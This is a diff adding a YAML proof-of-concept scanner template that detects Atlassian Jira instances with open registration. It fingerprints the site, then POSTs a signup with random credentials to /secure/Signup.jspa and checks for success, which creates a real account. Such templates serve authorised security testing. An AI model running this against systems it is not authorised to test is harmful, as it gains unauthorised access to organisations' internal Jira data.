@@ -1,0 +1,21 @@
+name: poc-yaml-atlassian-jira-anyuserreg
+set:
+  redemail: randomLowercase(8)
+  redpassword: randomLowercase(11)
+rules:
+  - method: GET
+    path: "/"
+    expression: |
+      response.body.bcontains(b"Atlassian")
+  - method: POST
+    path: "/secure/Signup.jspa"
+    follow_redirects: true
+    body: |
+      email={{redemail}}@qq.com&fullname={{redemail}}&username={{redemail}}&password={{redpassword}}3&Signup=%E6%B3%A8%E5%86%8C&atl_token=123
+    expression: |
+      response.status == 200 && response.body.bcontains(b"aui-message aui-message-success success")
+detail:
+  author: tangshoupu
+  info: atlassian-jira开启了任意用户注册，存在企业内部信息泄露风险
+  links:
+    - https://mp.weixin.qq.com/s/lVCT6JAA_BU9h4ISLlMNbQ
